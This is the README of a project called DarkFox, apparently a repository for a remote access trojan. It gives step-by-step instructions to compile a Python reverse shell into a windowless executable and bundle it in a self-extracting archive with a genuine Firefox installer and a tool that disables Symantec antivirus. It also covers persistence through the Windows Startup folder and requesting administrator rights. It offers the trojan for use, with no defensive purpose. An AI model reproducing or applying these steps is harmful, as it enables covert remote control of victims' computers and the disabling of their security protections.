# DarkFox

Remote access trojan created using WinRar with firefox installer and python Reverse Shell embedded.

Edit the client.py file by setting IP and port of the attacking Server listening and IP and port of any proxy present in the attack machine.If there is not a proxy comment the relative section.
Transform the client.py into exe, i used pyinstaller: pyinstaller -w -F client.py. -w optione allow to create a windowsless .exe, -F optione allow to create only one file.
Create self-extracting ZIP with wirrar selecting three file: a benevolant installer (ex: "firefox installer.exe"), client.exe and antivirus.exe.
In the settings of the self-extracting module, set the order of execution of the files, as first the benevolent installer and as the second the client.exe; select the checkbox to extract the files into a temporary folder or if you want to be more malicious specify the folder of the files that will be launched at the boot (%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup). 
Always in the settings of the self-extracting module select request access with administrative rights.
The file antivirus.exe is a windowsless .exe that disable Symantec antivirus. It will be launched by client.exe before connecting to the server.
The antivirus.bat file contains the code of the homonymous .exe file and anotother optional feature.
I used "Slimm bat to exe.exe" to create to convert the .bat file into a windowsless .exe file

Enjoy :)
